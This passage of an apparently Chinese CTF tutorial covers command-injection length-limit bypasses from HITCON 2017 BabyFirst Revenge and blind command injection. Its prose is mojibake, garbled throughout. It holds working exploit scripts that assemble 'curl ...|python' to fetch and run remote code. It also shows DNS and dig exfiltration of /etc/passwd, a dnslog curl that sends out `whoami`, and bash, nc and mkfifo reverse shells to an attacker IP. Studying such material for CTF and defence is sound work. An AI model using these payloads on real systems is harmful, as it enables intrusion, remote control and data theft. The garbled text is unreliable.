[\u0026#34;1.php\u0026#34;,\u0026#34;-O\\ \\\\\u0026#34;,\u0026#34;cn\\ \\\\\u0026#34;,\u0026#34;\\ a.\\\\\u0026#34;,\u0026#34;wget\\\\\u0026#34;] # linuxåˆ›å»ºä¸­é—´æœ‰ç©ºæ ¼çš„æ–‡ä»¶åï¼Œéœ€è¦è½¬ä¹‰ï¼Œæ‰€ä»¥æœ‰è¯·æ±‚\u0026#34;cn\\ \\\\\u0026#34; # å¯ä»¥ä¿®æ”¹hostsæ–‡ä»¶ï¼Œè®©a.cnæŒ‡å‘ä¸€ä¸ªè‡ªå·±çš„æœåŠ¡å™¨ã€‚ # åœ¨a.cn çš„æ ¹ç›®å½•ä¸‹åˆ›å»ºindex.html ï¼Œå†…å®¹æ˜¯ä¸€ä¸ªphp shell  for fileName in fileNames: createFileUrl = url+\u0026#34;\u0026gt;\u0026#34;+fileName print createFileUrl requests.get(createFileUrl) getShUrl = url + \u0026#34;ls -t\u0026gt;1\u0026#34; print getShUrl requests.get(getShUrl) getShellUrl = url + \u0026#34;sh 1\u0026#34; print getShellUrl requests.get(getShellUrl) shellUrl = \u0026#34;http://192.168.56.129/1.php\u0026#34; response = requests.get(shellUrl) if response.status_code == 200: print \u0026#34;[*] Get shell !\u0026#34; else : print \u0026#34;[*] fail!\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: GetShell() Example 2\täº”å­—ç»•è¿‡\t[HITCON CTF 2017-BabyFirst Revenge] æºç :\n\u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 5) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); è¿™é‡Œéœ€è¦æˆ‘ä»¬æ³¨æ„çš„æ˜¯cmd \u0026lt;= 5ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸èƒ½åœ¨ä½¿ç”¨ls -t\u0026gt;aã€‚\nä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡æ¯”è¾ƒå·§å¦™çš„æ„é€ æ¥å®ç°ls -t\u0026gt;aè¿™ä¹ˆä¸€ä¸ªæ“ä½œçš„ã€‚å¯ä»¥å…ˆé€šè¿‡æŠŠls -t\u0026gt;aè¿™æ ·æ‹†åˆ†æˆå‡ æ®µå†™å…¥åˆ°_æ–‡ä»¶å­˜æ”¾ã€‚\n \nä»å›¾ä¸­æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°_é‡Œé¢çš„å†…å®¹ï¼Œç¬¬ä¸€è¡Œæ— æ•ˆå‘½ä»¤ï¼Œ2-5è¡Œå› ä¸ºæœ«å°¾æœ‰\\è¿æ¥å­—ç¬¦çš„å­˜åœ¨æ‰€ä»¥å¯ä»¥è¿æ¥å­—ç¬¦ä¸²å½¢æˆls -t\u0026gt;gï¼Œæœ€åä¸€è¡Œæ‰§è¡Œlsã€‚æ‰€ä»¥sh _æˆ‘ä»¬å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ls -t\u0026gt;gçš„æ•ˆæœã€‚è¾¾åˆ°ä¸Example 1ä¸€è‡´çš„æ•ˆæœï¼Œå…¶ä»–æ­¥éª¤ä¸Example 1ç±»ä¼¼ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚ä¸‹é¢ç»™å‡ºOrangeçš„exp\nimport requests from time import sleep from urllib import quote payload = [ # generate `ls -t\u0026gt;g` file \u0026#39;\u0026gt;ls\\\\\u0026#39;, \u0026#39;ls\u0026gt;_\u0026#39;, \u0026#39;\u0026gt;\\ \\\\\u0026#39;, \u0026#39;\u0026gt;-t\\\\\u0026#39;, \u0026#39;\u0026gt;\\\u0026gt;g\u0026#39;, \u0026#39;ls\u0026gt;\u0026gt;_\u0026#39;, # generate `curl orange.tw.tw\u0026gt;python` # curl shell.0xb.pw|python \u0026#39;\u0026gt;on\u0026#39;, \u0026#39;\u0026gt;th\\\\\u0026#39;, \u0026#39;\u0026gt;py\\\\\u0026#39;, \u0026#39;\u0026gt;\\|\\\\\u0026#39;, \u0026#39;\u0026gt;pw\\\\\u0026#39;, \u0026#39;\u0026gt;x.\\\\\u0026#39;, \u0026#39;\u0026gt;xx\\\\\u0026#39;, \u0026#39;\u0026gt;l.\\\\\u0026#39;, \u0026#39;\u0026gt;el\\\\\u0026#39;, \u0026#39;\u0026gt;sh\\\\\u0026#39;, \u0026#39;\u0026gt;\\ \\\\\u0026#39;, \u0026#39;\u0026gt;rl\\\\\u0026#39;, \u0026#39;\u0026gt;cu\\\\\u0026#39;, # exec \u0026#39;sh _\u0026#39;, \u0026#39;sh g\u0026#39;, ] # r = requests.get(\u0026#39;http://localhost/tmp/?reset=1\u0026#39;) for i in payload: assert len(i) \u0026lt;= 5 r = requests.get(\u0026#39;http://localhost/tmp/?cmd=\u0026#39; + quote(i) ) print i sleep(0.2) ç›¸å…³Writeup:\n HITCON CTF 2017-BabyFirst Revenge-writeup HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl) HITCON 2017 CTF BabyFirst Revenge HITCON CTF 2017 - BabyFirst Revenge (172 pts.) Hitcon CTF 2017 - Baby Revenge Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd) HITCON CTF 2017 BabyFirst Revenge \u0026amp; v2 writeup BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter  Example 3\tå››å­—ç»•è¿‡\t[HITCON 2017 BabyFirst Revenge v2] æºç ï¼š\n\u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 4) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); ?\u0026gt;è¿™é¢˜ç›¸æ¯”ä¹‹å‰åˆéš¾äº†ä¸€ç‚¹ï¼Œè¿™æ¬¡æ˜¯cmd \u0026lt;= 4ï¼Œä½†æ˜¯åŸç†è¿˜æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬è¦å¤„ç†çš„é—®é¢˜è¿˜æ˜¯ls -t\u0026gt;gè¿™ä¹ˆä¸€ä¸ªé—®é¢˜ã€‚ç„¶åå› ä¸ºé•¿åº¦é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬è¿˜ç”¨\\\\ä½œä¸ºå­—ç¬¦ä¸²è¿æ¥çš„è¯ï¼Œåªå‰©ä¸‹ä¸¤ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šæœ€å¼€å§‹å¿…é¡»è¦ç”¨\u0026gt;åˆ›å»ºæ–‡ä»¶ï¼Œæ‰€ä»¥åªå‰©ä¸‹ä¸€ä¸ªå¯æ§å­—ç¬¦ã€‚æ‰€ä»¥ç¢°åˆ°éœ€è¦è½¬ä¹‰ç©ºæ ¼è¿™ç§åœ°æ–¹ä¾‹å¦‚Exmaple 2ä¸­çš„\u0026gt;\\ \\\\è¿™é‡Œå°±ä¸èƒ½å†ä½¿ç”¨äº†ã€‚ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå†æä¸€ä¸ªtrick\n \n \n* ç›¸å½“äº$(dir *),æ‰€ä»¥è¯´å¦‚æœæ–‡ä»¶åå¦‚æœæ˜¯å‘½ä»¤çš„è¯å°±ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœ,ä¹‹åçš„ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚ä¾‹å¦‚ï¼š\n \næ‰€ä»¥å›åˆ°é¢˜ç›®ï¼Œå¦‚æœæŒ‰ç…§é¡ºåºå»åˆ›å»ºæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°å¦‚æœç›´æ¥ç”¨*å»æ‰§è¡Œçš„è¯ï¼Œå‘ç°å¹¶ä¸å¯ä»¥ï¼Œå› ä¸ºæŒ‰ç…§dirçš„æ–‡ä»¶æ’åºï¼Œ-tä¹Ÿæ˜¯æ’åœ¨æœ€å‰é¢ã€‚\n \næ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å‚è€ƒä¸€ä¸‹alphabeticalæ¥æ’åºï¼Œè¿™é‡Œå°±ä¸è¦ç”¨Dockeræ¥åšäº†ï¼Œå› ä¸ºbusyboxé‡Œé¢ä¸€äº›ä¸œè¥¿è¿˜æ˜¯è·ŸçœŸå®ç¯å¢ƒä¼˜ç‚¹åŒºåˆ«çš„ã€‚ \næ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦è¿ç”¨-å­—ç¬¦çš„è¯ï¼Œä»–ä¼šæ’åœ¨æœ€å‰é¢ï¼Œè¿™é‡Œå°±æ¯”è¾ƒå‘äº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³ä¸ªåŠæ³•æŠŠ-tç½®äºåé¢ã€‚\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨t-è¿™ç§é€†åºçš„æ¨¡å¼æŠŠtæ”¾åˆ°å‰é¢æ¥ï¼Œå°±å¯ä»¥æ¯”è¾ƒæ­£å¸¸çš„æ’åºäº†ã€‚\né€†åºçš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥ç”¨revæ¥å®ç°ï¼Œå¦å¤–æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå­—æ¯æ¯”è¾ƒé å‰çš„å‘½ä»¤æ¥å±•ç¤ºå½“å‰ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨diræ¥å±•ç¤ºå½“å‰ç›®å½•ï¼ŒåŒæ—¶då­—æ¯ä¹Ÿæ¯”è¾ƒé å‰ï¼Œä¸è¦åƒlsç‰¹åˆ«è€ƒè™‘æ’åºçš„é—®é¢˜ã€‚æ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥é€šè¿‡è¿™ä¹ˆä¸€ä¸ªå½¢å¼å»æ„é€ ls -t\u0026gt;g\n \nè¿™é‡Œå¯èƒ½æœ‰å‡ ä¸ªè®©å¤§å®¶æ¯”è¾ƒç–‘æƒ‘çš„åœ°æ–¹ï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆæ˜¯\u0026gt;ht-ï¼Œä¸ªäººç†è§£æ˜¯å› ä¸ºlsé€†åºæ˜¯slï¼Œsæ˜¯æ’åœ¨tå‰çš„ï¼Œå¦‚æœä¸åŠ hï¼Œt-ä¼šåœ¨slä¹‹åï¼Œè€Œä¸”ls -thä¸ls -tæ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œç„¶åæˆ‘ä»¬å†æ‰¾ä¸€ä¸ªhä¹‹å‰çš„å­—æ¯åšè¾“å‡ºæ–‡ä»¶å°±å¯ä»¥äº†ã€‚è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹å°±æ˜¯*v\u0026gt;xï¼Œä¹‹å‰æˆ‘ä»¬è®²è¿‡äº†é€šé…ç¬¦ä»¥åŠ*çš„ä½œç”¨ï¼Œè¿™é‡Œ*vå°±ç›¸å½“äº$(dir *v)\u0026gt;xï¼Œdir *vè¿”å›çš„å°±æ˜¯ç»“å°¾ä¸ºvçš„æ–‡ä»¶ï¼Œè¿™é‡Œå°±æ˜¯revä¸vä¸¤ä¸ªæ–‡ä»¶ï¼Œå¦‚æœåªæœ‰ç›¸å½“äºå…ˆæŠŠvæ–‡ä»¶å†…å®¹è¿›è¡Œé€†åºï¼Œè€Œåå†è¾“å…¥åˆ°xæ–‡ä»¶ï¼Œè¿™æ ·æ•´ä¸ªls -t\u0026gt;gçš„å‘½ä»¤æ‹¼å‡‘å°±å®Œæˆäº†ï¼Œæ¥ç€æ–¹æ³•å°±æœ‰å¾ˆå¤šç§äº†ï¼Œæ¯”è¾ƒç®€å•çš„å°±æ˜¯ç›´æ¥wgetæˆ–è€…curlä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ä¸Šå°±å¥½äº†ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚\nå†ç»™ä¸€ä¸ªOrangeçš„exp\nimport requests from time import sleep from urllib import quote payload = [ # generate \u0026#34;g\u0026gt; ht- sl\u0026#34; to file \u0026#34;v\u0026#34; \u0026#39;\u0026gt;dir\u0026#39;, \u0026#39;\u0026gt;sl\u0026#39;, \u0026#39;\u0026gt;g\\\u0026gt;\u0026#39;, \u0026#39;\u0026gt;ht-\u0026#39;, \u0026#39;*\u0026gt;v\u0026#39;, # reverse file \u0026#34;v\u0026#34; to file \u0026#34;x\u0026#34;, content \u0026#34;ls -th \u0026gt;g\u0026#34; \u0026#39;\u0026gt;rev\u0026#39;, \u0026#39;*v\u0026gt;x\u0026#39;, # generate \u0026#34;curl orange.tw|python;\u0026#34; \u0026#39;\u0026gt;\\;\\\\\u0026#39;, \u0026#39;\u0026gt;on\\\\\u0026#39;, \u0026#39;\u0026gt;th\\\\\u0026#39;, \u0026#39;\u0026gt;py\\\\\u0026#39;, \u0026#39;\u0026gt;\\|\\\\\u0026#39;, \u0026#39;\u0026gt;tw\\\\\u0026#39;, \u0026#39;\u0026gt;e.\\\\\u0026#39;, \u0026#39;\u0026gt;ng\\\\\u0026#39;, \u0026#39;\u0026gt;ra\\\\\u0026#39;, \u0026#39;\u0026gt;o\\\\\u0026#39;, \u0026#39;\u0026gt;\\ \\\\\u0026#39;, \u0026#39;\u0026gt;rl\\\\\u0026#39;, \u0026#39;\u0026gt;cu\\\\\u0026#39;, # got shell \u0026#39;sh x\u0026#39;, \u0026#39;sh g\u0026#39;, ] r = requests.get(\u0026#39;http://52.197.41.31/?reset=1\u0026#39;) for i in payload: assert len(i) \u0026lt;= 4 r = requests.get(\u0026#39;http://52.197.41.31/?cmd=\u0026#39; + quote(i) ) print i sleep(0.1) ç›¸å…³Writeup:\n Baby First Revenge v2 (Via vim) by @bennofs [python] baby-exp.py How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2 HITCON CTF 2017 BabyFirst Revenge \u0026amp; v2 writeup  æ— å›æ˜¾çš„å‘½ä»¤æ³¨å…¥ æˆ‘ä»¬ä¹‹å‰æåˆ°çš„å¤§éƒ¨åˆ†éƒ½æ˜¯æœ‰å›æ˜¾æˆ–è€…ä¸€éƒ¨åˆ†æç¤ºçš„å‘½ä»¤æ³¨å…¥ï¼Œå½“æˆ‘ä»¬é‡åˆ°æ— å›æ˜¾çš„å‘½ä»¤æ³¨å…¥çš„æ—¶å€™æˆ‘ä»¬åˆè¦æ€ä¹ˆåŠå‘¢ï¼Ÿ\nDNS Log é¡¹ç›®åœ°å€ï¼šBugScanTeam/DNSLog\nå¯¹äºä¸€äº›å‘½ä»¤ç›²æ³¨ç±»çš„æ¼æ´ï¼Œè¿™é€šå¸¸æ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•ï¼Œå› ä¸ºé€šå¸¸å‡ºç«™DNSæµé‡ä¸ä¼šè¢«é˜»æ­¢å¯ä»¥é€šè¿‡ï¼ŒDNSLog ä¸­çš„ WebLog éƒ¨åˆ†å°†å…¶è½¬åŒ–ä¸ºæœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œï¼š\ncurl \u0026quot;http://testhash.test.dnslog.link/?`whoami`\u0026quot; è¿™ä¸ªç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œç›´æ¥å»æŸ¥çœ‹å¯¹åº”çš„è®°å½•å°±å¥½äº†ã€‚\n \n \næœ‰æ—¶å€™ä½ éœ€è¦ç¼–ç æƒ³è¦è¯»å‡ºæ¥çš„å†…å®¹ï¼Œè¿™æ ·æ‰ä¸ä¼šç”±äºä¸€äº›ç©ºæ ¼æˆ–è€…ä»€ä¹ˆå…¶ä»–å­—ç¬¦å¯¼è‡´è¯»ä¸å®Œæ•´æ•°æ®ã€‚\nè¿™é‡Œä¸ä»…å¯ä»¥ç”¨äºå‘½ä»¤æ³¨å…¥ï¼Œè¿˜å¯ä»¥ç”¨äºxssç­‰å…¶ä»–ä¸€äº›æ— å›æ˜¾çš„æ”»å‡»ã€‚\nè¿™é‡Œå†ç»™ä¸ªèµ°udpæµé‡çš„ç¤ºä¾‹\nOnly OB DNS traffic (UDP/53) allowed and can exec commands? Use dig `cut -d: -s -f1 /etc/passwd | sed 10\\!d` @ip to offload file contents. æœåŠ¡ç«¯ï¼š\nnc -l -n -vv -p 53 -u -k(å¦‚æœä¸æ”¯æŒ-kä¹Ÿå¯ä»¥ä¸ç”¨-k)  \n \nSame:\n{dig,`{cut,-d:,-s,-f1,/etc/passwd}|{sed,2\\!d}`,@ip} sleep æ£€æµ‹æ˜¯å¦æœ‰å‘½ä»¤æ³¨å…¥æ¯”è¾ƒå¥½çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨sleepï¼Œå¹¶è§‚å¯Ÿå…¶æ‰§è¡Œæ—¶é—´æ˜¯å¦å¢åŠ ã€‚\n$ time ruby ping.rb \u0026#39;8.8.8.8\u0026#39; PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.09s user 0.04s system 4% cpu 3.176 total $ time ruby ping.rb \u0026#39;8.8.8.8 \u0026amp;\u0026amp; sleep 5\u0026#39; PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.10s user 0.04s system 1% cpu 8.182 total å¯ä»¥çœ‹å‡ºå¦‚æœå­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œæ—¶é—´ä¼šæŒ‰ç…§æˆ‘ä»¬sleepçš„å‚æ•°å¢åŠ ï¼Œæˆ‘ä»¬è¿™é‡Œå†ç®€å•æ€»ç»“ä¸€ä¸‹å‰é¢å•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«ï¼Œä»¥ä¸‹éƒ½éœ€è¦å»æ‰åæ–œæ ï¼ˆä¸»é¢˜æœ‰ç‚¹æ€ª\n   å‘½ä»¤ ç»“æœ     {% raw %} ping -c 4 8.8.8.8 `sleep 5` {% endraw %} sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨å‘½ä»¤è¡Œä¸­ã€‚   {% raw %} ping -c 4 \u0026ldquo;8.8.8.8 `sleep 5`\u0026rdquo; {% endraw %} sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨å¤æ‚çš„å­—ç¬¦ä¸²åŒå¼•å·ä¹‹é—´ã€‚   {% raw %}ping -c 4 $(echo 8.8.8.8 `sleep 5`){% endraw %} sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨ä½¿ç”¨ä¸åŒç¬¦å·æ—¶ã€‚   {% raw %}ping -c 4 \u0026lsquo;8.8.8.8 `sleep 5`'{% endraw %} sleepå‘½ä»¤ä¸æ‰§è¡Œï¼Œå‘½ä»¤æ›¿æ¢åœ¨ç®€å•å­—ç¬¦ä¸²ä¸­ä¸èµ·ä½œç”¨ï¼ˆå•å¼•å·ä¹‹é—´ï¼‰ã€‚   {% raw %}ping -c 4 `echo 8.8.8.8 `sleep 5``{% endraw %} sleepå‘½ä»¤ä¸æ‰§è¡Œï¼Œä½¿ç”¨ç›¸åŒç¬¦å·æ—¶å‘½ä»¤æ›¿æ¢ä¸èµ·ä½œç”¨ã€‚   ping -c 4 8.8.8.8;sleep 5 sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œå‘½ä»¤åœ¨å‘½ä»¤è¡Œä¸­é¡ºåºæ‰§è¡Œã€‚   ping -c 4 \u0026ldquo;8.8.8.8;sleep 5\u0026rdquo; sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚   ping -c 4 $(echo 8.8.8.8;sleep 5) sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œæ’åºå‘½ä»¤åœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚   ping -c 4 \u0026lsquo;8.8.8.8;sleep 5\u0026rsquo; sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œ é™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚   ping -c 4 `echo 8.8.8.8;sleep 5` sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œæ’åºå‘½ä»¤åœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚   ping -c 4 8.8.8.8 | sleep 5 sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤è¡Œæ­£å¸¸æ‰§è¡Œã€‚   ping -c 4 \u0026ldquo;8.8.8.8 | sleep 5\u0026rdquo; sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚   ping -c 4 $(echo 8.8.8.8 | sleep 5) sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚   ping -c 4 \u0026lsquo;8.8.8.8 | sleep 5\u0026rsquo; sleepå‘½ä»¤æœªè¢«æ‰§è¡Œï¼Œé™„åŠ å‘½ä»¤è¢«æ³¨å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™pingå‘½ä»¤ã€‚   ping -c 4 `echo 8.8.8.8 | sleep 5` sleepå‘½ä»¤è¢«æ‰§è¡Œï¼Œç®¡é“è¾“å‡ºåœ¨å‘½ä»¤æ›¿æ¢ä¸­èµ·ä½œç”¨ã€‚    é™¤äº†æ¢æµ‹æ˜¯å¦æœ‰å‘½ä»¤æ³¨å…¥ä¹‹å¤–ï¼Œsleepè¿˜æœ‰ä¸€ä¸ªå¯ä»¥ç”¨äºå‘½ä»¤ç›²æ³¨çš„æ–¹æ³•ã€‚\nsleep $(hostname | cut -c 1 | tr a 5)  æˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ä¸ºhostnameã€‚æˆ‘ä»¬å‡è®¾å®ƒè¿”å›hacker.localã€‚ å®ƒéœ€è¦è¾“å‡ºå¹¶å°†å…¶ä¼ é€’ç»™cut -c 1ã€‚è¿™å°†é€‰å–hacker.localçš„ç¬¬ä¸€ä¸ªå­—ç¬¦hã€‚ æ¥ç€é€šè¿‡trå‘½ä»¤å°†å­—ç¬¦aæ›¿æ¢ä¸º5ã€‚ ç„¶åå°†trå‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™sleepå‘½ä»¤ï¼Œsleep hè¢«æ‰§è¡Œå°†ä¼šç«‹å³å‡ºç°æŠ¥é”™ï¼Œè¿™æ˜¯å› ä¸ºsleepåè·Ÿçš„å‚æ•°æ™ºèƒ½ä¸ºä¸€ä¸ªæ•°å­—ã€‚ç„¶åï¼Œç›®æ ‡ä½¿ç”¨trå‘½ä»¤è¿­ä»£å­—ç¬¦ã€‚æ‰§è¡Œsleep $(hostname | cut -c 1 | tr h 5)å‘½ä»¤ï¼Œå°†éœ€è¦5ç§’é’Ÿçš„æ—¶é—´ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªhã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å°±èƒ½å°†å®Œæ•´çš„ä¸»æœºåçŒœè§£å‡ºæ¥ã€‚  å½“ç„¶ï¼Œè¿™ä¸ªåˆ©ç”¨æ¡ä»¶å¯èƒ½å¯¹ç½‘ç»œç¯å¢ƒè¦æ±‚æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä¾é å“åº”æ—¶é—´çš„ç›¸å¯¹æ—¶é—´æ¥åˆ¤æ–­ï¼Œä¹Ÿè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“åˆ¤æ–­çš„ï¼Œæµ‹è¯•ç¤ºä¾‹ï¼š\n   å‘½ä»¤ æ—¶é—´ ç»“æœ     ruby server-online.rb \u0026lsquo;8.8.8.8;sleep $(hostname | cut -c 1 | tr a 5)\u0026rsquo; 3s â€“   ruby server-online.rb \u0026lsquo;8.8.8.8;sleep $(hostname | cut -c 1 | tr h 5)\u0026rsquo; 8s h   ruby server-online.rb \u0026lsquo;8.8.8.8;sleep $(hostname | cut -c 2 | tr a 5)\u0026rsquo; 8s a   ruby server-online.rb \u0026lsquo;8.8.8.8;sleep $(hostname | cut -c 3 | tr a 5)\u0026rsquo; 3s â€“   ruby server-online.rb \u0026lsquo;8.8.8.8;sleep $(hostname | cut -c 3 | tr c 5)\u0026rsquo; 8s c    å¦‚æœæƒ³è¦çŸ¥é“ç›®æ ‡ä¸»æœºåçš„é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸»æœºåçš„è¾“å‡ºé€šè¿‡ç®¡é“ç¬¦ä¼ é€’ç»™wc -cå‘½ä»¤ã€‚hacker.localä¸º12ä¸ªå­—ç¬¦ã€‚hostnameå‘½ä»¤è¿”å›ä¸»æœºåå’Œä¸€ä¸ªæ–°è¡Œï¼Œå› æ­¤wc -cå°†æ˜¾ç¤º13ä¸ªå­—ç¬¦ã€‚ç»è¿‡æˆ‘ä»¬æµ‹è¯•ï¼Œè„šæœ¬çš„æ‰§è¡Œæ—¶é—´æœ€çŸ­éœ€è¦3ç§’é’Ÿã€‚\n$ time ruby server-online.rb \u0026#39;8.8.8.8 \u0026amp;\u0026amp; sleep $(hostname | wc -c)\u0026#39; yes 0.10s user 0.04s system 0% cpu 16.188 total å¯ä»¥çœ‹åˆ°ä»¥ä¸Šçš„payloadè„šæœ¬å…±ç”¨æ—¶16ç§’æ‰æ‰§è¡Œå®Œæˆï¼Œè¿™æ„å‘³ç€ä¸»æœºåä¸º12ä¸ªå­—ç¬¦ï¼š16 â€“ 3 (åŸæ—¶é—´) â€“ 1 (æ–°è¡Œ) = 12ä¸ªå­—ç¬¦ã€‚å½“åœ¨WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œæ­¤payloadæ—¶ï¼Œè¾“å‡ºç»“æœå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼šå½“è¯·æ±‚ç”±ä¸åŒçš„æœåŠ¡å™¨å¤„ç†æ—¶ï¼Œä¸»æœºåçš„é•¿åº¦ä¹Ÿå¯èƒ½ä¼šæ”¹å˜ã€‚\næœ¬æ¬¡NUAACTFæˆ‘ä¹Ÿæ˜¯ä»è¿™é‡Œå‡ºäº†ä¸€ä¸ªç‚¹ï¼Œå¼ºè¿«ä½¿ç”¨sleep $(xxx)æ¥è¯»å–flagã€‚\nä½¿ç”¨æš´éœ²çš„æœåŠ¡ åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç«¯å£æ‰«æï¼Œå¹¶ä¸”åŸºäºæš´éœ²çš„æœåŠ¡ç¡®å®šæå–è¾“å‡ºçš„æ–¹å¼ã€‚\n FTPï¼šå°è¯•å°†æ–‡ä»¶å†™å…¥å¯ä»¥ä»ä¸­ä¸‹è½½æ–‡ä»¶çš„ç›®å½•ã€‚ SSHï¼šå°è¯•å°†å‘½ä»¤çš„è¾“å‡ºå†™å…¥MOTD bannerï¼Œç„¶ååªéœ€SSHåˆ°æœåŠ¡å™¨ã€‚ Webï¼šå°è¯•å°†å‘½ä»¤çš„è¾“å‡ºå†™å…¥å…¬å…±ç›®å½•ï¼ˆ/var/www/ï¼‰ä¸­ã€‚  åå¼¹shell ä¸è¿‡æ— è®ºæ€ä¹ˆç©ï¼Œè¿˜æ˜¯ç›´æ¥å¼¹å›ä¸€ä¸ªshellæ¥æœ€å®ç”¨ï¼Œäºæ˜¯å¯ä»¥æœ‰\nbashæ–¹å¼\nbash -c \u0026#34;sh \u0026gt;\u0026amp; /dev/tcp/your ip/port 0\u0026gt;\u0026amp;1\u0026#34; execæ–¹å¼\n$ exec 5\u0026lt;\u0026gt;/dev/tcp/ip/port $ cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done  \n \nncæ–¹å¼\næœ¬æœºè¿è¡Œ\nnc -l -vv -p port ç›®æ ‡ä¸»æœº\nnc -e /bin/bash ip port å¦ä¸€ç§ncæ–¹å¼\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc ip port 